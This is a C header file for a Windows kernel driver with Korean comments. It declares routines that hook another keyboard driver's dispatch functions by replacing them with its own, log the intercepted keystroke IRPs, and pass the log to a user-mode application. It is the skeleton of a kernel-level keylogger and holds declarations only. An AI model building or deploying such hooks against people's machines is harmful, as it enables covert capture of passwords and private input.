#pragma once

#include <wdm.h>
#include <wdmsec.h>
#include <stdio.h>
#include <ntddkbd.h>
#include <devioctl.h>
#include "AppInterface.h"


////////////////////////////////////////
//driver 주요 루틴들
////////////////////////////////////////
NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath);
NTSTATUS KeyboardHookerCreate(PDEVICE_OBJECT pFDO, PIRP pIrp);
NTSTATUS KeyboardHookerDeviceIoControl(PDEVICE_OBJECT pFDO, PIRP pIrp);
NTSTATUS KeyboardHookerClose(PDEVICE_OBJECT pFDO, PIRP pIrp);
NTSTATUS KeyboardHookerCleanup(PDEVICE_OBJECT pFDO, PIRP pIrp);
void KeyboardHookerUnload(PDRIVER_OBJECT pDriverObject);

////////////////////////////////////////
//hooking 보조 함수들
////////////////////////////////////////
void HookCallback(unsigned char MajorFunction); //후킹 -> 기존driver함수 저장 + 내껄로 바꿔치기
NTSTATUS NewHookerDispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp); //기존 driver 함수 대신 수행할 나만의 함수 만들기
void UnhookCallback(unsigned char MajorFunction); //가로챈 상태를 복원함
void doPreparePostProcessingIrp(PIRP Irp);
NTSTATUS HookerCompletionRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID pContext);

////////////////////////////////////////
//logging 보조 함수들
////////////////////////////////////////

BOOLEAN InsertLog(PIRP Irp, BOOLEAN bIsStatus); // 로그항목을 하나 보관하는 함수
ULONG GetAndRemoveLog(void* OutputBuffer, ULONG OutputBufferLength);
void ClearLog(); //로그 전체 삭제

////////////////////////////////////////
//util 함수들
////////////////////////////////////////

NTSTATUS FindDriverObject();